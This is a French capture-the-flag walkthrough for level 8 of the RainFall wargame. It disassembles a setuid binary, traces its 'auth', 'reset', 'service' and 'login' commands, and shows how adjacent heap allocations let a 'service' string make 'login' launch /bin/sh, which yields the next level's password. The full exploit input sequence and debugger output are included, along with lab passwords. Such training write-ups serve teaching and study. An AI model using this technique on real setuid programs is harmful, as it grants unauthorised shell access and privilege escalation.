# LEVEL 8

### Reconnaissance

On se connecte au level8 avec le password : 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9

On trouve un binaire:
```
level8@192.168.56.102's password: 
  GCC stack protector support:            Enabled
  Strict user copy checks:                Disabled
  Restrict /dev/mem access:               Enabled
  Restrict /dev/kmem access:              Enabled
  grsecurity / PaX: No GRKERNSEC
  Kernel Heap Hardening: No KERNHEAP
 System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level8/level8
level8@RainFall:~$ ls
level8                                                                                                                                                 
level8@RainFall:~$ file level8                                                                                                                         
level8: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x3067a180acabc94d328ab89f0a5a914688bf67ab, not stripped                                                                                           
level8@RainFall:~$ ./level8                                                                                                                            
(nil), (nil)                                                                                                                                           
aaa aaa                                                                                                                                                
(nil), (nil)                                                                                                                                           
^C                                                                                                                                                     
```

- Partie 1: Compréhention du code.

Début du main
```
│           0x08048564      55             push ebp                                                                             
│           0x08048565      89e5           mov ebp, esp                                                                         
│           0x08048567      57             push edi                                                                             
│           0x08048568      56             push esi                                                                             
│           0x08048569      83e4f0         and esp, 0xfffffff0                                                                  
│           0x0804856c      81eca0000000   sub esp, 0xa0                                                                                        
│       ┌─< 0x08048572      eb01           jmp 0x8048575                                                                                        
│       │   ; CODE XREFS from main @ 0x80486dc, 0x80486fa, 0x8048727                                                                            
│    ┌┌┌──> 0x08048574      90             nop                                                                                                  
│    ╎╎╎│   ; CODE XREF from main @ 0x8048572                                                                                                   
│    ╎╎╎└─> 0x08048575      8b0db09a0408   mov ecx, dword [obj.service] ; [0x8049ab0:4]=0                                                       
│    ╎╎╎    0x0804857b      8b15ac9a0408   mov edx, dword [obj.auth]   ; [0x8049aac:4]=0                                                        
│    ╎╎╎    0x08048581      b810880408     mov eax, str.p___p          ; 0x8048810 ; "%p, %p \n"                                                                  
│    ╎╎╎    0x08048586      894c2408       mov dword [nitems], ecx                                                                                                
│    ╎╎╎    0x0804858a      89542404       mov dword [size], edx                                                                                                  
│    ╎╎╎    0x0804858e      890424         mov dword [esp], eax        ; const char *format                                                                       
│    ╎╎╎    0x08048591      e87afeffff     call sym.imp.printf         ; int printf(const char *format)                                                           
│    ╎╎╎    0x08048596      a1809a0408     mov eax, dword [obj.stdin]  ; obj.stdin__GLIBC_2.0                                                                     
│    ╎╎╎                                                               ; [0x8049a80:4]=0                                                                          
│    ╎╎╎    0x0804859b      89442408       mov dword [nitems], eax     ; FILE *stream                                                                             
│    ╎╎╎    0x0804859f      c74424048000.  mov dword [size], 0x80      ; [0x80:4]=-1 ; 128 ; int size                                                             
│    ╎╎╎    0x080485a7      8d442420       lea eax, dword [src]                                                                                                   
│    ╎╎╎    0x080485ab      890424         mov dword [esp], eax        ; char *s                                                                                   
│    ╎╎╎    0x080485ae      e88dfeffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)  
│    ╎╎╎    0x080485b3      85c0           test eax, eax
│    ╎╎╎┌─< 0x080485b5      0f8471010000   je 0x804872c 
```
Ici rien de bien complexe, On a un appel a <a href="https://www.tutorialspoint.com/c_standard_library/c_function_printf.htm">```printf```</a> et un <a href="https://www.tutorialspoint.com/c_standard_library/c_function_fgets.htm">```fgets```</a> derriere.

On peux remarquer 2 variables (Qui on été déclaré hors du main) : ```obj.service``` et ```obj.auth```.

Selon le retour de fgets <a href="http://www.penguin.cz/~literakl/intel/j.html">```je```</a> nous renvoie a l'adresse ```0x804872c``` qui est a la fin du main.
```
|    ╎╎╎│   0x080485bb      8d442420       lea eax, dword [src]                                                                                                   
│    ╎╎╎│   0x080485bf      89c2           mov edx, eax                                                                                                           
│    ╎╎╎│   0x080485c1      b819880408     mov eax, str.auth           ; 0x8048819 ; "auth "                                                                       
│    ╎╎╎│   0x080485c6      b905000000     mov ecx, 5                                                                                                             
│    ╎╎╎│   0x080485cb      89d6           mov esi, edx
│    ╎╎╎│   0x080485cd      89c7           mov edi, eax
│    ╎╎╎│   0x080485cf      f3a6           repe cmpsb byte [esi], byte ptr es:[edi]
│    ╎╎╎│   0x080485d1      0f97c2         seta dl
│    ╎╎╎│   0x080485d4      0f92c0         setb al
│    ╎╎╎│   0x080485d7      89d1           mov ecx, edx
│    ╎╎╎│   0x080485d9      28c1           sub cl, al
│    ╎╎╎│   0x080485db      89c8           mov eax, ecx
│    ╎╎╎│   0x080485dd      0fbec0         movsx eax, al
│    ╎╎╎│   0x080485e0      85c0           test eax, eax
│   ┌─────< 0x080485e2      755e           jne 0x8048642
```
ici on peux voir : <a href="http://www.penguin.cz/~literakl/intel/r.html">```repe```</a><a href="https://www.aldeid.com/wiki/X86-assembly/Instructions/cmpsb">```cmpsb```</a> qui est un opérateur de comparaison.

*Dans tous les variantes de ```rep```, l'instruction ainsi préfixée est répétée et ECX décrémenté jusqu'à ce que ce dernier atteigne zéro.*

Il compare la chaine ```"auth "``` (qui est mis dans EAX) sur une longueur de 5 (ECX). On peux donc en déduire un comportement similaire a <a href="https://manpages.debian.org/buster/manpages-dev/strncmp.3.en.html">```strncmp```</a> meme si la fonction n'est pas explicitement appeler.

On essaie avec ltrace:
```
level8@RainFall:~$ ltrace ./level8 
__libc_start_main(0x8048564, 1, 0xbffff7f4, 0x8048740, 0x80487b0 <unfinished ...>
printf("%p, %p \n", (nil), (nil)(nil), (nil) 
)                                                            = 14
fgets(auth 
"auth\n", 128, 0xb7fd1ac0)                                                             = 0xbffff6d0
printf("%p, %p \n", (nil), (nil)(nil), (nil) 
)                                                            = 14
fgets(auth 
"auth \n", 128, 0xb7fd1ac0)                                                            = 0xbffff6d0
malloc(4)                                                                                    = 0x0804a008
strcpy(0x0804a008, "\n")                                                                     = 0x0804a008
printf("%p, %p \n", 0x804a008, (nil)0x804a008, (nil) 
)
```
Notre ```obj.auth``` est bien initialisé **uniquement** si la comparaison est faite avec ```"auth "``` (Il faut l'espace).

```
│   │╎╎╎│   0x080485e4      c70424040000.  mov dword [esp], 4          ; size_t size
│   │╎╎╎│   0x080485eb      e880feffff     call sym.imp.malloc         ;  void *malloc(size_t size)
│   │╎╎╎│   0x080485f0      a3ac9a0408     mov dword [obj.auth], eax   ; [0x8049aac:4]=0
│   │╎╎╎│   0x080485f5      a1ac9a0408     mov eax, dword [obj.auth]   ; [0x8049aac:4]=0
│   │╎╎╎│   0x080485fa      c70000000000   mov dword [eax], 0
│   │╎╎╎│   0x08048600      8d442420       lea eax, dword [src]
│   │╎╎╎│   0x08048604      83c005         add eax, 5
│   │╎╎╎│   0x08048607      c744241cffff.  mov dword [var_90h], 0xffffffff ; [0xffffffff:4]=-1 ; -1
│   │╎╎╎│   0x0804860f      89c2           mov edx, eax
│   │╎╎╎│   0x08048611      b800000000     mov eax, 0
│   │╎╎╎│   0x08048616      8b4c241c       mov ecx, dword [var_90h]
│   │╎╎╎│   0x0804861a      89d7           mov edi, edx
│   │╎╎╎│   0x0804861c      f2ae           repne scasb al, byte es:[edi]
│   │╎╎╎│   0x0804861e      89c8           mov eax, ecx
│   │╎╎╎│   0x08048620      f7d0           not eax
│   │╎╎╎│   0x08048622      83e801         sub eax, 1
│   │╎╎╎│   0x08048625      83f81e         cmp eax, 0x1e               ; 30
│  ┌──────< 0x08048628      7718           ja 0x8048642
│  ││╎╎╎│   0x0804862a      8d442420       lea eax, dword [src]
│  ││╎╎╎│   0x0804862e      8d5005         lea edx, dword [eax + 5]
│  ││╎╎╎│   0x08048631      a1ac9a0408     mov eax, dword [obj.auth]   ; [0x8049aac:4]=0
│  ││╎╎╎│   0x08048636      89542404       mov dword [size], edx       ; const char *src
│  ││╎╎╎│   0x0804863a      890424         mov dword [esp], eax        ; char *dest
│  ││╎╎╎│   0x0804863d      e81efeffff     call sym.imp.strcpy         ; char *strcpy(char *dest, const char *src)
│  ││╎╎╎│   ; CODE XREFS from main @ 0x80485e2, 0x8048628
│  └└─────> 0x08048642      8d442420       lea eax, dword [src]
```
Si notre comparaison est ok, il fait un malloc d'une size de 4. Autrement il va a cette adresse ```0x08048642```.

Après notre ```malloc(4)``` on a une autre comparaison avec <a href="https://www.aldeid.com/wiki/X86-assembly/Instructions/repne">```repne```</a> et <a href="https://www.aldeid.com/wiki/X86-assembly/Instructions/scasb">```scasb```</a> qu'on pourait traduire par : *REPeat while Not Equal SCan A String.*

Il s'agit en faite d'un <a href="https://manpages.debian.org/buster/manpages-dev/strlen.3.en.html">```strlen```</a> qui compare la longueur de la chaine avec ```0x1e``` (30). Le <a href="http://www.penguin.cz/~literakl/intel/j.html">```JA```</a> est la condition pour faire le <a href="https://manpages.debian.org/stretch/manpages-fr-dev/strcpy.3.fr.html">```strcpy```</a> ou non.

On s'en assure:
```
level8@RainFall:~$ ltrace ./level8 
__libc_start_main(0x8048564, 1, 0xbffff7f4, 0x8048740, 0x80487b0 <unfinished ...>
printf("%p, %p \n", (nil), (nil)(nil), (nil) 
)                                                            = 14
fgets(auth aaaaaaaaaaaaaaaaaaaaaaaaaaaaa
"auth aaaaaaaaaaaaaaaaaaaaaaaaaaa"..., 128, 0xb7fd1ac0)                                = 0xbffff6d0
malloc(4)                                                                                    = 0x0804a008
strcpy(0x0804a008, "aaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n")                                        = 0x0804a008
printf("%p, %p \n", 0x804a008, (nil)0x804a008, (nil) 
)                                                        = 18
fgets(auth bbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
"auth bbbbbbbbbbbbbbbbbbbbbbbbbbb"..., 128, 0xb7fd1ac0)                                = 0xbffff6d0
malloc(4)                                                                                    = 0x0804a018
printf("%p, %p \n", 0x804a018, (nil)0x804a018, (nil) 
)
```
le strcpy a été fait lorqu'on a 29 a. En revanche lors du test des 30 b, le strcpy n'est pas fait.

```
│  └└─────> 0x08048642      8d442420       lea eax, dword [src]
│    ╎╎╎│   0x08048646      89c2           mov edx, eax
│    ╎╎╎│   0x08048648      b81f880408     mov eax, str.reset          ; 0x804881f ; "reset"
│    ╎╎╎│   0x0804864d      b905000000     mov ecx, 5
│    ╎╎╎│   0x08048652      89d6           mov esi, edx
│    ╎╎╎│   0x08048654      89c7           mov edi, eax
│    ╎╎╎│   0x08048656      f3a6           repe cmpsb byte [esi], byte ptr es:[edi]
│    ╎╎╎│   0x08048658      0f97c2         seta dl
│    ╎╎╎│   0x0804865b      0f92c0         setb al
│    ╎╎╎│   0x0804865e      89d1           mov ecx, edx
│    ╎╎╎│   0x08048660      28c1           sub cl, al
│    ╎╎╎│   0x08048662      89c8           mov eax, ecx
│    ╎╎╎│   0x08048664      0fbec0         movsx eax, al
│    ╎╎╎│   0x08048667      85c0           test eax, eax
│   ┌─────< 0x08048669      750d           jne 0x8048678
│   │╎╎╎│   0x0804866b      a1ac9a0408     mov eax, dword [obj.auth]   ; [0x8049aac:4]=0
│   │╎╎╎│   0x08048670      890424         mov dword [esp], eax        ; void *ptr
│   │╎╎╎│   0x08048673      e8a8fdffff     call sym.imp.free           ; void free(void *ptr)
│   │╎╎╎│   ; CODE XREF from main @ 0x8048669
│   └─────> 0x08048678      8d442420       lea eax, dword [src]
```
Ici meme chose, on fait une comparaison avec ```"reset"``` et une longueur de 5. Si c'est égale, on ```free(auth)```

On test:
```
level8@RainFall:~$ ltrace ./level8 
__libc_start_main(0x8048564, 1, 0xbffff7f4, 0x8048740, 0x80487b0 <unfinished ...>
printf("%p, %p \n", (nil), (nil)(nil), (nil) 
)                                                            = 14
fgets(auth 
"auth \n", 128, 0xb7fd1ac0)                                                            = 0xbffff6d0
malloc(4)                                                                                    = 0x0804a008
strcpy(0x0804a008, "\n")                                                                     = 0x0804a008
printf("%p, %p \n", 0x804a008, (nil)0x804a008, (nil) 
)                                                        = 18
fgets(reset
"reset\n", 128, 0xb7fd1ac0)                                                            = 0xbffff6d0
free(0x0804a008)                                                                             = <void>
printf("%p, %p \n", 0x804a008, (nil)0x804a008, (nil) 
)                                                        = 18
fgets(reset
"reset\n", 128, 0xb7fd1ac0)                                                            = 0xbffff6d0
free(0x0804a008*** glibc detected *** ./level8: double free or corruption (fasttop): 0x0804a008 ***
======= Backtrace: =========
/lib/i386-linux-gnu/libc.so.6(+0x74f82)[0xb7ea0f82]
./level8[0x8048678]
/lib/i386-linux-gnu/libc.so.6(__libc_start_main+0xf3)[0xb7e454d3]
./level8[0x80484d1]
======= Memory map: ========
08048000-08049000 r-xp 00000000 00:10 12277      /home/user/level8/level8
08049000-0804a000 rwxp 00000000 00:10 12277      /home/user/level8/level8
0804a000-0806b000 rwxp 00000000 00:00 0          [heap]
b7e07000-b7e23000 r-xp 00000000 07:00 17889      /lib/i386-linux-gnu/libgcc_s.so.1
b7e23000-b7e24000 r-xp 0001b000 07:00 17889      /lib/i386-linux-gnu/libgcc_s.so.1
b7e24000-b7e25000 rwxp 0001c000 07:00 17889      /lib/i386-linux-gnu/libgcc_s.so.1
b7e2b000-b7e2c000 rwxp 00000000 00:00 0 
b7e2c000-b7fcf000 r-xp 00000000 07:00 17904      /lib/i386-linux-gnu/libc-2.15.so
b7fcf000-b7fd1000 r-xp 001a3000 07:00 17904      /lib/i386-linux-gnu/libc-2.15.so
b7fd1000-b7fd2000 rwxp 001a5000 07:00 17904      /lib/i386-linux-gnu/libc-2.15.so
b7fd2000-b7fd5000 rwxp 00000000 00:00 0 
b7fd8000-b7fdd000 rwxp 00000000 00:00 0 
b7fdd000-b7fde000 r-xp 00000000 00:00 0          [vdso]
b7fde000-b7ffe000 r-xp 00000000 07:00 17933      /lib/i386-linux-gnu/ld-2.15.so
b7ffe000-b7fff000 r-xp 0001f000 07:00 17933      /lib/i386-linux-gnu/ld-2.15.so
b7fff000-b8000000 rwxp 00020000 07:00 17933      /lib/i386-linux-gnu/ld-2.15.so
bffdf000-c0000000 rwxp 00000000 00:00 0          [stack]
 <unfinished ...>
--- SIGABRT (Aborted) ---
+++ killed by SIGABRT +++
```
On entre 2 fois ```reset```, on a un double free.

```
│   └─────> 0x08048678      8d442420       lea eax, dword [src]
│    ╎╎╎│   0x0804867c      89c2           mov edx, eax
│    ╎╎╎│   0x0804867e      b825880408     mov eax, str.service        ; 0x8048825 ; "service"
│    ╎╎╎│   0x08048683      b906000000     mov ecx, 6
│    ╎╎╎│   0x08048688      89d6           mov esi, edx
│    ╎╎╎│   0x0804868a      89c7           mov edi, eax
│    ╎╎╎│   0x0804868c      f3a6           repe cmpsb byte [esi], byte ptr es:[edi]
│    ╎╎╎│   0x0804868e      0f97c2         seta dl
│    ╎╎╎│   0x08048691      0f92c0         setb al
│    ╎╎╎│   0x08048694      89d1           mov ecx, edx
│    ╎╎╎│   0x08048696      28c1           sub cl, al
│    ╎╎╎│   0x08048698      89c8           mov eax, ecx
│    ╎╎╎│   0x0804869a      0fbec0         movsx eax, al
│    ╎╎╎│   0x0804869d      85c0           test eax, eax
│   ┌─────< 0x0804869f      7514           jne 0x80486b5
│   │╎╎╎│   0x080486a1      8d442420       lea eax, dword [src]
│   │╎╎╎│   0x080486a5      83c007         add eax, 7
│   │╎╎╎│   0x080486a8      890424         mov dword [esp], eax        ; const char *src
│   │╎╎╎│   0x080486ab      e880fdffff     call sym.imp.strdup         ; char *strdup(const char *src)
│   │╎╎╎│   0x080486b0      a3b09a0408     mov dword [obj.service], eax ; [0x8049ab0:4]=0
│   │╎╎╎│   ; CODE XREF from main @ 0x804869f
│   └─────> 0x080486b5      8d442420       lea eax, dword [src]
```
On recommence avec ```"service"```, longueur de 6. Si c'est egal, on fait un ```service = strdup(buffer + 7)```.

On test:
```
level8@RainFall:~$ ltrace ./level8 
__libc_start_main(0x8048564, 1, 0xbffff7f4, 0x8048740, 0x80487b0 <unfinished ...>
printf("%p, %p \n", (nil), (nil)(nil), (nil) 
)                                                            = 14
fgets(service
"service\n", 128, 0xb7fd1ac0)                                                          = 0xbffff6d0
strdup("\n")                                                                                 = 0x0804a008
printf("%p, %p \n", (nil), 0x804a008(nil), 0x804a008 
)
```
Notre ```obj.service``` est bien initialisé (ici avec "\n").

```
│   └─────> 0x080486b5      8d442420       lea eax, dword [src]
│    ╎╎╎│   0x080486b9      89c2           mov edx, eax
│    ╎╎╎│   0x080486bb      b82d880408     mov eax, str.login          ; 0x804882d ; "login"
│    ╎╎╎│   0x080486c0      b905000000     mov ecx, 5
│    ╎╎╎│   0x080486c5      89d6           mov esi, edx
│    ╎╎╎│   0x080486c7      89c7           mov edi, eax
│    ╎╎╎│   0x080486c9      f3a6           repe cmpsb byte [esi], byte ptr es:[edi]
│    ╎╎╎│   0x080486cb      0f97c2         seta dl
│    ╎╎╎│   0x080486ce      0f92c0         setb al
│    ╎╎╎│   0x080486d1      89d1           mov ecx, edx
│    ╎╎╎│   0x080486d3      28c1           sub cl, al
│    ╎╎╎│   0x080486d5      89c8           mov eax, ecx
│    ╎╎╎│   0x080486d7      0fbec0         movsx eax, al
│    ╎╎╎│   0x080486da      85c0           test eax, eax
│    └────< 0x080486dc      0f8592feffff   jne 0x8048574
│     ╎╎│   0x080486e2      a1ac9a0408     mov eax, dword [obj.auth]   ; [0x8049aac:4]=0
│     ╎╎│   0x080486e7      8b4020         mov eax, dword [eax + 0x20]
│     ╎╎│   0x080486ea      85c0           test eax, eax
│    ┌────< 0x080486ec      7411           je 0x80486ff
│    │╎╎│   0x080486ee      c70424338804.  mov dword [esp], str.bin_sh ; [0x8048833:4]=0x6e69622f ; "/bin/sh" ; const char *string
│    │╎╎│   0x080486f5      e886fdffff     call sym.imp.system         ; int system(const char *string)
│    │└───< 0x080486fa      e975feffff     jmp 0x8048574
│    │ ╎│   ; CODE XREF from main @ 0x80486ec
│    └────> 0x080486ff      a1a09a0408     mov eax, dword [obj.stdout] ; obj.stdout__GLIBC_2.0
│      ╎│                                                              ; [0x8049aa0:4]=0                                                                           
│      ╎│   0x08048704      89c2           mov edx, eax
│      ╎│   0x08048706      b83b880408     mov eax, str.Password:      ; 0x804883b ; "Password:\n"
│      ╎│   0x0804870b      8954240c       mov dword [stream], edx     ; FILE *stream
│      ╎│   0x0804870f      c74424080a00.  mov dword [nitems], 0xa     ; size_t nitems
│      ╎│   0x08048717      c74424040100.  mov dword [size], 1         ; size_t size
│      ╎│   0x0804871f      890424         mov dword [esp], eax        ; const void *ptr
│      ╎│   0x08048722      e829fdffff     call sym.imp.fwrite         ; size_t fwrite(const void *ptr, size_t size, size_t nitems, FILE *stream)
│      └──< 0x08048727      e948feffff     jmp 0x8048574
```
Et enfin, la comparation avec ```"login"```, longueur de 5.

Si c'est inégal, sa nous raméne au début du programme (adresse ```0x08048574```).

Sinon on enchaine avec un <a href="https://en.wikipedia.org/wiki/TEST_(x86_instruction)">```test```</a>``` eax, eax``` qui nous amène au ```fwrite("Password:\n", 1, 10, stdout)``` ou a ```system("/bin/sh")```.

On test sa :
```
level8@RainFall:~$ ltrace ./level8 
__libc_start_main(0x8048564, 1, 0xbffff7f4, 0x8048740, 0x80487b0 <unfinished ...>
printf("%p, %p \n", (nil), (nil)(nil), (nil) 
)                                                            = 14
fgets(login
"login\n", 128, 0xb7fd1ac0)                                                            = 0xbffff6d0
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
```

On segfault car ```obj.auth``` n'a pas été alloué.
```
[...]
Stopped reason: SIGSEGV
0x080486e7 in main ()
``` 

Si on verifie avec gdb:
```
db-peda$ r
Starting program: /home/yoginet/Documents/101/rainfall/level8/level_8 login
(nil), (nil) 
login 
[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0x0 
ECX: 0xffffd100 --> 0xf7fe3539 (add    ebx,0x19ac7)
EDX: 0xffffd100 --> 0xf7fe3539 (add    ebx,0x19ac7)
ESI: 0xffffd155 --> 0x8000000a 
EDI: 0x8048832 --> 0x69622f00 ('')
EBP: 0xffffd1d8 --> 0x0 
ESP: 0xffffd130 --> 0xffffd150 ("login\n")
EIP: 0x80486e7 (<main+387>:     mov    eax,DWORD PTR [eax+0x20])
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80486da <main+374>:        test   eax,eax
   0x80486dc <main+376>:        jne    0x8048574 <main+16>
   0x80486e2 <main+382>:        mov    eax,ds:0x8049aac
=> 0x80486e7 <main+387>:        mov    eax,DWORD PTR [eax+0x20]
[...]

gdb-peda$ r
Starting program: /home/yoginet/Documents/101/rainfall/level8/level_8 login
(nil), (nil) 
auth 
0x804a9c0, (nil) 
login
[----------------------------------registers-----------------------------------]
EAX: 0x804a9c0 --> 0xa ('\n')
EBX: 0x0 
ECX: 0xffffd100 --> 0xffffd151 ("ogin\n")
EDX: 0xffffd100 --> 0xffffd151 ("ogin\n")
ESI: 0xffffd155 --> 0x8000000a 
EDI: 0x8048832 --> 0x69622f00 ('')
EBP: 0xffffd1d8 --> 0x0 
ESP: 0xffffd130 --> 0xffffd150 ("login\n")
EIP: 0x80486e7 (<main+387>:     mov    eax,DWORD PTR [eax+0x20])
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80486da <main+374>:        test   eax,eax
   0x80486dc <main+376>:        jne    0x8048574 <main+16>
   0x80486e2 <main+382>:        mov    eax,ds:0x8049aac
=> 0x80486e7 <main+387>:        mov    eax,DWORD PTR [eax+0x20]
[...]
```

Il faut faire en sorte qu'il soit alloué:
```
level8@RainFall:~$ ltrace ./level8 
__libc_start_main(0x8048564, 1, 0xbffff7f4, 0x8048740, 0x80487b0 <unfinished ...>
printf("%p, %p \n", (nil), (nil)(nil), (nil) 
)                                                            = 14
fgets(auth 
"auth \n", 128, 0xb7fd1ac0)                                                            = 0xbffff6d0
malloc(4)                                                                                    = 0x0804a008
strcpy(0x0804a008, "\n")                                                                     = 0x0804a008
printf("%p, %p \n", 0x804a008, (nil)0x804a008, (nil) 
)                                                        = 18
fgets(login
"login\n", 128, 0xb7fd1ac0)                                                            = 0xbffff6d0
fwrite("Password:\n", 1, 10, 0xb7fd1a20Password:
)                                                     = 10
printf("%p, %p \n", 0x804a008, (nil)0x804a008, (nil) 
) 
```

Sa fonctionne, nous verrons lors de l'exploitation comment acceder au ```/bin/sh```.

Et on termine:
```
│       └─> 0x0804872c      90             nop
│           0x0804872d      b800000000     mov eax, 0
│           0x08048732      8d65f8         lea esp, dword [var_8h]
│           0x08048735      5e             pop esi
│           0x08048736      5f             pop edi
│           0x08048737      5d             pop ebp
└           0x08048738      c3             ret
```

- Partie 2: Comment exploité ce binaire ?

Pour pouvoir ouvrir un shell, il faut que dans le "strncmp de login", on n'emprunte pas le ```je 0x80486ff```.

Il faut donc arrivé a faire en sorte que EAX ne soit pas a 0.

### Exploitation

Les commandes a lancé pour exploité le binaires:
```
level8@RainFall:~$ ./level8 
(nil), (nil) 
auth 
0x804a008, (nil) 
serviceAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
0x804a008, 0x804a018 
login
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```

On regarde les appels qui on été fait:
```
level8@RainFall:~$ ltrace ./level8                                                                                
__libc_start_main(0x8048564, 1, 0xbffff7f4, 0x8048740, 0x80487b0 <unfinished ...>                                 
printf("%p, %p \n", (nil), (nil)(nil), (nil)                                                                      
)                                     = 14                                                                        
fgets(auth                                                                                                        
"auth \n", 128, 0xb7fd1ac0)                                     = 0xbffff6d0
malloc(4)                                                             = 0x0804a008
strcpy(0x0804a008, "\n")                                              = 0x0804a008
printf("%p, %p \n", 0x804a008, (nil)0x804a008, (nil) 
)                                 = 18
fgets(serviceAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
"serviceAAAAAAAAAAAAAAAAAAAAAAAAA"..., 128, 0xb7fd1ac0)         = 0xbffff6d0
strdup("AAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n")                             = 0x0804a018
printf("%p, %p \n", 0x804a008, 0x804a0180x804a008, 0x804a018 
)                             = 22
fgets(login
"login\n", 128, 0xb7fd1ac0)                                     = 0xbffff6d0
system("/bin/sh"$ 
```

Qu'est ce qu'il c'est passé ? On regarde sa avec gdb:
```
gdb-peda$ r
Starting program: /home/yoginet/Documents/101/rainfall/level8/level_8 
(nil), (nil) 
auth 
[...]
gdb-peda$ c
Continuing.
0x804a9c0, (nil) 
serviceAAAAAAAAAAAAAAAAAAAAAAAAAAAAA       
0x804a9c0, 0x804a9d0 
login
[...]
gdb-peda$ ni
[----------------------------------registers-----------------------------------]
EAX: 0x41414141 ('AAAA')
EBX: 0x0 
ECX: 0xffffd100 --> 0xffffd151 ("ogin\n")
EDX: 0xffffd100 --> 0xffffd151 ("ogin\n")
ESI: 0xffffd155 --> 0x4141000a ('\n')
EDI: 0x8048832 --> 0x69622f00 ('')
EBP: 0xffffd1d8 --> 0x0 
ESP: 0xffffd130 --> 0xffffd150 ("login\n")
EIP: 0x80486ea (<main+390>:     test   eax,eax)
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80486dc <main+376>:        jne    0x8048574 <main+16>
   0x80486e2 <main+382>:        mov    eax,ds:0x8049aac
   0x80486e7 <main+387>:        mov    eax,DWORD PTR [eax+0x20]
=> 0x80486ea <main+390>:        test   eax,eax
   0x80486ec <main+392>:        je     0x80486ff <main+411>
   0x80486ee <main+394>:        mov    DWORD PTR [esp],0x8048833
   0x80486f5 <main+401>:        call   0x8048480 <system@plt>
   0x80486fa <main+406>:        jmp    0x8048574 <main+16>
[------------------------------------stack-------------------------------------]
0000| 0xffffd130 --> 0xffffd150 ("login\n")
0004| 0xffffd134 --> 0x80 
0008| 0xffffd138 --> 0xf7fae580 --> 0xfbad2288 
0012| 0xffffd13c --> 0xffffd1ac --> 0x8048761 (<__libc_csu_init+33>:    lea    eax,[ebx-0xe0])
0016| 0xffffd140 --> 0xf7ffdae0 --> 0xf7fcb3e0 --> 0xf7ffd980 --> 0x0 
0020| 0xffffd144 --> 0x1 
0024| 0xffffd148 --> 0xf7fcb410 --> 0x8048315 ("GLIBC_2.0")
0028| 0xffffd14c --> 0xffffffff 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 3, 0x080486ea in main ()
gdb-peda$ ni
[----------------------------------registers-----------------------------------]
EAX: 0x41414141 ('AAAA')
EBX: 0x0 
ECX: 0xffffd100 --> 0xffffd151 ("ogin\n")
EDX: 0xffffd100 --> 0xffffd151 ("ogin\n")
ESI: 0xffffd155 --> 0x4141000a ('\n')
EDI: 0x8048832 --> 0x69622f00 ('')
EBP: 0xffffd1d8 --> 0x0 
ESP: 0xffffd130 --> 0xffffd150 ("login\n")
EIP: 0x80486ec (<main+392>:     je     0x80486ff <main+411>)
EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80486e2 <main+382>:        mov    eax,ds:0x8049aac
   0x80486e7 <main+387>:        mov    eax,DWORD PTR [eax+0x20]
   0x80486ea <main+390>:        test   eax,eax
=> 0x80486ec <main+392>:        je     0x80486ff <main+411>
   0x80486ee <main+394>:        mov    DWORD PTR [esp],0x8048833
   0x80486f5 <main+401>:        call   0x8048480 <system@plt>
   0x80486fa <main+406>:        jmp    0x8048574 <main+16>
   0x80486ff <main+411>:        mov    eax,ds:0x8049aa0
                                                              JUMP is NOT taken
[------------------------------------stack-------------------------------------]
0000| 0xffffd130 --> 0xffffd150 ("login\n")
0004| 0xffffd134 --> 0x80 
0008| 0xffffd138 --> 0xf7fae580 --> 0xfbad2288 
0012| 0xffffd13c --> 0xffffd1ac --> 0x8048761 (<__libc_csu_init+33>:    lea    eax,[ebx-0xe0])
0016| 0xffffd140 --> 0xf7ffdae0 --> 0xf7fcb3e0 --> 0xf7ffd980 --> 0x0 
0020| 0xffffd144 --> 0x1 
0024| 0xffffd148 --> 0xf7fcb410 --> 0x8048315 ("GLIBC_2.0")
0028| 0xffffd14c --> 0xffffffff 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x080486ec in main ()
```
EAX pointe sur 0x41414141, il n'est plus a 0.

Si on break juste avant:
```
gdb-peda$ ni
[----------------------------------registers-----------------------------------]
EAX: 0x804a9c0 --> 0xa ('\n')
EBX: 0x0 
ECX: 0xffffd100 --> 0xffffd151 ("ogin\n")
EDX: 0xffffd100 --> 0xffffd151 ("ogin\n")
ESI: 0xffffd155 --> 0x4141000a ('\n')
EDI: 0x8048832 --> 0x69622f00 ('')
EBP: 0xffffd1d8 --> 0x0 
ESP: 0xffffd130 --> 0xffffd150 ("login\n")
EIP: 0x80486e7 (<main+387>:     mov    eax,DWORD PTR [eax+0x20])
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80486da <main+374>:        test   eax,eax
   0x80486dc <main+376>:        jne    0x8048574 <main+16>
   0x80486e2 <main+382>:        mov    eax,ds:0x8049aac
=> 0x80486e7 <main+387>:        mov    eax,DWORD PTR [eax+0x20]
   0x80486ea <main+390>:        test   eax,eax
   0x80486ec <main+392>:        je     0x80486ff <main+411>
   0x80486ee <main+394>:        mov    DWORD PTR [esp],0x8048833
   0x80486f5 <main+401>:        call   0x8048480 <system@plt>
[------------------------------------stack-------------------------------------]
0000| 0xffffd130 --> 0xffffd150 ("login\n")
0004| 0xffffd134 --> 0x80 
